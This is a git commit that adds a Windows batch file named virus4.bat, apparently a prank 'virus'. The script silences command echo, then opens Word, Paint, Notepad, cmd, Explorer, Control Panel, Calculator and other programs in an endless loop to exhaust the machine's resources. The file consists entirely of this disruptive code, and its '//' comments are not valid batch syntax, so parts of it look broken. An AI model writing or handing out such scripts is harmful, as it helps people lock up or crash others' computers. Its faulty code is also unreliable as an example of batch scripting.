c9a715002fb099131db27d058be408dc76a5a524
davidbanu <davidbanu@ymail.com>
2016-09-21 00:24:21 +0300

    Start multiple programs - loop

---
+++ virus4.bat
@@ -0,0 +1,11 @@
+@echo off //it will hide the commands when the file will be exec
+:x // loop var
+start winword
+start mspaint
+start notepad
+start write
+start cmd
+start explorer
+start control
+start calc
+goto x//infinte loop
